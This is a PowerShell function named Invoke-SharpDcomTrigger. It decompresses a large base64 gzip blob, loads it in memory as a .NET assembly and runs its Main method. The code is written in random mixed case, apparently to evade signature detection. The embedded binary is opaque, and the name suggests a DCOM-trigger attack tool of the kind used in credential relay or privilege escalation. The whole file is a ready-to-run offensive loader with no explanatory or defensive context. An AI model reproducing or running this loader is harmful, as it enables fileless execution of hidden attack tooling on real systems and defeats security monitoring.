function Invoke-SharpDcomTrigger
{
	$a = NeW-obJeCt sYsTeM.Io.MEMoRysTREaM(,[coNveRT]::frombaSE64sTrINg("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"))
	$DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM($a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
	$OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
	$dEcoMPReSSEd.copYto( $outPUt )
	[BYte[]]$ByTEOuTarrAy = $OUtPUT.toarrAY()
	$RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
	$olDconsOLeOuT = [CONSoLe]::out
	$StRInGwritEr = nEW-ObJEct System.IO.STRiNgwRiTEr
	[cONSOLE]::sEtOut($STringWRITer)

	[SharpDcomTrigger.Program]::maiN([string[]]$args)

	[cOnsolE]::sEtout($olDCONsOleout)
	$resUlTs = $sTRInGWRiter.TOSTring()
	$rESuLTs
}